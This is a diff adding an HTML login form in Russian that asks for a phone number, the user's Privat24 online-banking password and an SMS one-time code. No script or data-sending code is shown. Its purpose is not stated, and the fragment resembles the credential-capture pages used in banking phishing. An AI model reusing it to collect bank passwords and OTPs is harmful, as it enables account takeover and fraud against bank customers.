@@ -1,0 +1,63 @@
+<div id="two" class="ui-body-d ui-content">
+    <div id="div_login_forms">
+        <div class="row" id="main_logo1">
+            <div class="col-sm-2"></div>
+            <div class="col-sm-8 text-center">
+                <img class="img_size" src="static/images/main.png"/>
+            </div>
+            <div class="col-sm-2"></div>
+        </div>
+        <div id="login_phone" class="login-form login-phone">
+            <div class="row">
+                <div class="col-sm-1"></div>
+                <div class="col-sm-10">
+                    <label for="phone_number"><h4>Ваш телефон +</h4></label>
+                    <input type="tel" class="input_size default_phone numeric"  disabled="disabled" readonly="readonly" name="phone_number" id="phone_number"  maxlength="16">
+                </div>
+                <div class="col-sm-1"></div>
+            </div>
+            <div class="row">
+                <div class="col-sm-1"></div>
+                <div class="col-sm-10">
+                    <label for="password"><h4>Ваш пароль в приват24</h4></label>
+                    <input type="password" class="input_size" name="password" id="password" value="" autocomplete="off">
+                </div>
+                <div class="col-sm-1"></div>
+            </div>
+            <div class="row text-center">
+                <div class="col-sm-1"></div>
+                <div class="col-sm-10" >
+                    <input class="btn btn-success" id="btn_login" value="Дальше" type="submit" /></div>
+                <div class="col-sm-1"></div>
+            </div>
+
+        </div>
+        <div id="link_phone" class="login-form otp-code" style="display: none">
+            <div class="row">
+                <div class="col-sm-1"></div>
+                <div class="col-sm-10">
+                    <label for="phone_number_link"><h4>Ваш телефон +</h4></label>
+                    <input type="tel" class="input_size default_phone numeric" name="phone_number" id="phone_number_link" maxlength="16">
+                </div>
+                <div class="col-sm-1"></div>
+            </div>
+            <div class="row otp-cnt" style="display: none">
+                <div class="col-sm-1"></div>
+                <div class="col-sm-10">
+                    <label for="code"><h4>Пароль из SMS</h4></label>
+                    <input class="input_size" id="code" type="tel" value="" maxlength="8"/>
+                </div>
+                <div class="col-sm-1"></div>
+            </div>
+            <div class="row text-center">
+                <div class="col-sm-1"></div>
+                <div class="col-sm-10" ><input class="btn btn-success" id="btn_link_phone" value="Дальше" type="submit" /></div>
+                <div class="col-sm-1"></div>
+            </div>
+
+        </div>
+        <div class="row hidden-xs">
+            <div class="col-sm-12" id="space_but_top"></div>
+        </div>
+    </div>
+</div>
